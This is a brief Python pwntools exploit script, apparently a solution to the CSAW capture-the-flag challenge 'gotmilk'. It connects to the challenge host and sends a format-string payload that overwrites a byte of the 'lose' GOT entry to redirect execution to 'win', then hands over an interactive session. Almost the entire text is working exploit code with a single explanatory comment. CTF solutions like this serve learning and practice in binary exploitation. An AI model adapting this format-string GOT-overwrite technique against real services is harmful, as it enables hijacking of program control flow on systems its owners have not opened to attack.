from pwn import *

elf = ELF('./gotmilk')
p = remote('pwn.chal.csaw.io', 1004)

lose_got = elf.got['lose']

log.info('lose@got: ' + hex(lose_got))

payload = p32(lose_got)
payload += '%133c%7$hhn' # Writes 0x89 to the last byte of lose@got, effectively changing it to win's address from libmylib.so

p.sendlineafter('? ', payload)

p.interactive()
